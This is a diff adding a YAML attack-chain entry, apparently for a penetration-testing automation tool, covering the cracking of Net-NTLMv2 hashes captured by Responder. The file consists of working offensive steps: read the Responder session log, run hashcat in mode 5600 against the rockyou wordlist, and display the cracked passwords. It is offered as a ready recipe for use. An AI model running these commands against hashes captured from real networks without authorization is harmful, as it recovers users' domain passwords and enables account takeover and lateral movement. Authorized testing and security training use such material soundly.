@@ -1,0 +1,28 @@
+chain_id: net_ntlmv2_crack
+title: "Crack Net-NTLMv2 captured by Responder (hashcat -m 5600)"
+severity: CRITICAL
+tags: [crypto, ntlm, responder, hashcat]
+
+trigger:
+  any_of:
+    - { kind: net-ntlmv2 }
+
+description: |
+  Net-NTLMv2 hash captured (typically by Responder during MITM/poisoning).
+  Format: user::domain:challenge:hmac:blob. Crack offline with hashcat -m 5600.
+
+steps:
+  - id: 1
+    title: "Save the captured hash exactly as Responder logged it"
+    command: cat /usr/share/responder/logs/Responder-Session.log
+
+  - id: 2
+    title: "Crack with hashcat"
+    command: hashcat -m 5600 -a 0 ntlmv2.hash /usr/share/wordlists/rockyou.txt
+
+  - id: 3
+    title: "Show the result"
+    command: hashcat -m 5600 ntlmv2.hash --show
+
+references:
+  - https://github.com/lgandx/Responder
